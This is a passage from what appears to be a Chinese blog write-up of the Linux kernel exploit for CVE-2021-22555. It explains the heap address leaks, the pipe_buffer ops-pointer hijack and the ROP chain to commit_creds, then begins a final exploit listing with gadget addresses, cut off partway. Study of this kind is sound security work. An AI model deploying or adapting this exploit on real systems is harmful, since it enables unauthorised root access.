<p>之后我们修改<code>fake_msg_msg</code>的<code>struct msg_msgseg *next</code>指针，指向上述获得的消息队列2的<code>struct list_head m_list</code>域的地址，就能读出该<code>struct list_head m_list</code>域的<code>prev</code>指针，即为消息队列2的辅助消息的地址，减去<code>0x400</code>即为<code>UAF</code>堆块的地址</p>

        <h3 id="2-泄露内核基地址"   >
          <a href="#2-泄露内核基地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-泄露内核基地址" class="headerlink" title="(2)泄露内核基地址"></a>(2)泄露内核基地址</h3>
      <p>接下来利用到<code>pipe</code>管道，主要是其中<code>struct pipe_inode_info</code>的<code>struct pipe_buffer *bufs;</code>数组，总大小为<code>0x280</code>，使用<code>kmalloc-1024</code>，满足当前的<code>UAF</code>（同样使用正常的<code>read/write</code>即可完成申请释放）。其结构为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>利用如下操作读取<code>const struct pipe_buf_operations *ops;</code>指针，即可泄露内核基地址</p>
<ul>
<li>利用 <code>sk_buff</code> 修复<code>UAF</code>处的辅助消息，之后从消息队列中接收该辅助消息，此时该<code>UAF</code>对象重回 <code>slub</code>的<code>kmalloc-1024</code>的<code>freelist</code>中，但 <code>sk_buff</code> 仍指向该<code>UAF</code>对象</li>
<li>喷射 <code>pipe_buffer</code>，就会将该<code>UAF</code>对象申请回来，将<code>pipe_buffer</code>写入到该<code>UAF</code>对象上，之后再接收 <code>sk_buff</code> 数据包，即可获取<code>pipe_buffer</code>上的数据，得到<code>const struct pipe_buf_operations *ops;</code>指针，即可泄露内核基地址</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220513115154194.png" alt="image-20220513115154194"></p>

        <h3 id="3-劫持程序执行流"   >
          <a href="#3-劫持程序执行流" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-劫持程序执行流" class="headerlink" title="(3)劫持程序执行流"></a>(3)劫持程序执行流</h3>
      <p>之前也提到过，当我们关闭管道<code>pipe</code>两端或者从管道<code>pipe</code>中读取出所有数据之后，会调用到<code>pipe_buf_release()</code>函数进行清理，其中会调用<code>struct pipe_buffer *bufs;</code>下的<code>const struct pipe_buf_operations *ops;</code>对应函数表中的<code>release</code>函数指针。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">pipe_buf_release</span><span class="params">(struct pipe_inode_info *pipe,</span></span></span><br><span class="line"><span class="params"><span class="function">				    struct pipe_buffer *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span> =</span> buf-&gt;ops;</span><br><span class="line"></span><br><span class="line">	buf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">	ops-&gt;release(pipe, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>现在我们就可以通过<code>sk_buff</code>来劫持劫持<code>ops</code>指针函数表，修改其中的<code>release</code>函数指针，完成劫持程序流。并且此时的<code>rsi</code>即为<code>buf</code>为我们的<code>UAF</code>对象，而<code>sk_buff</code>又可以使得<code>UAF</code>对象里的数据完全可控。如果找到一个可以将<code>rsp</code>劫持为<code>rsi</code>的<code>gadget</code>，那么就可以完全操控程序流程了。</p>

        <h2 id="3-EXP解析"   >
          <a href="#3-EXP解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-EXP解析" class="headerlink" title="3.EXP解析"></a>3.EXP解析</h2>
      <p>这个其实也没有什么好讲的，看懂漏洞利用过程其实也很容易写出来的，主要提一下某些比较偏的知识点，也防止忘记。</p>

        <h3 id="1-绑定CPU分配"   >
          <a href="#1-绑定CPU分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-绑定CPU分配" class="headerlink" title="(1)绑定CPU分配"></a>(1)绑定CPU分配</h3>
      <p>通常是用来进行堆块分配时查看堆块内存的，防止堆块申请的时候东一个西一个的，方便调试，同时也是为了提高堆喷射的稳定性</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bind the cpu0</span></span><br><span class="line"><span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line">CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;<span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">if</span> (sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sched_setaffinity&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-命名空间"   >
          <a href="#2-命名空间" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-命名空间" class="headerlink" title="(2)命名空间"></a>(2)命名空间</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setup_sandbox</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>EXP</code>原作者称：当<code>IPT_SO_SET_REPLACE</code>或<code>IP6T_SO_SET_REPLACE</code>在兼容模式下被调用时（需要<code>CAP_NET_ADMIN</code>权限）。</p>
<p>这个在源代码<code>do_ipt_set_ctl()</code>函数中有所体现</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_ipt_set_ctl</span><span class="params">(struct sock *sk, <span class="keyword">int</span> cmd, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	<span class="comment">//提到当兼容模式下需要CAP_NET_ADMIN权限</span></span><br><span class="line">	<span class="keyword">if</span> (!ns_capable(sock_net(sk)-&gt;user_ns, CAP_NET_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>而用户空间隔离出独立的命名空间后就能拥有<code>CAP_NET_ADMIN</code>权限，所以需要，其实也不是太懂这个干啥的。</p>
<p>其他的好像也没有什么了，就是最后的<code>ROP</code>链条方面的东西，由于最后触发劫持程序流的时候，<code>rsi</code>为<code>UAF</code>对象地址，所以利用<code>gadget</code>先进行栈劫持<code>rsp</code>，然后使用利用<code>commit_creds(&amp;init_cred)</code>获取ROOT权限，之后使用<code>SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE</code>绕过<code>KPTI</code>和<code>SMEP</code>即可。</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006" >Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="3-最终EXP"   >
          <a href="#3-最终EXP" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-最终EXP" class="headerlink" title="(3)最终EXP"></a>(3)最终EXP</h3>
      <p>主要是<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/bsauce/kernel-exploit-factory" >bsauce师傅的EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>和<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >arttnba3师傅的EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，然后改巴改巴，加了点东西，替换了一下ROP链条什么的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//compile exp: $ gcc -m32 -static -masm=intel -o exploit exploit.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_SOCKETS 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_SKBUFFS 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_PIPEFDS 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_MSQIDS 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOLE_STEP 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_PRIMARY 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_SECONDARY 0x42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_FAKE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Gadget </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUSH_RSI_JMP_RSI_0x2E 0xffffffff81b4e244</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_0x98_RET 0xffffffff81a7895e</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff81900644</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff81001629</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff8244c8a0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff8108e690</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00df0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82019340</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//pt_regs</span></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_eflags;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKB_SHARED_INFO_SIZE 0x140</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_MSG_SIZE (sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//some struct</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> m_list_next;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_list_prev;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_type;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_ts;</span><br><span class="line">  <span class="keyword">uint64_t</span> next;</span><br><span class="line">  <span class="keyword">uint64_t</span> security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> page;</span><br><span class="line">  <span class="keyword">uint32_t</span> offset;</span><br><span class="line">  <span class="keyword">uint32_t</span> len;</span><br><span class="line">  <span class="keyword">uint64_t</span> ops;</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line">  <span class="keyword">uint32_t</span> pad;</span><br><span class="line">  <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span 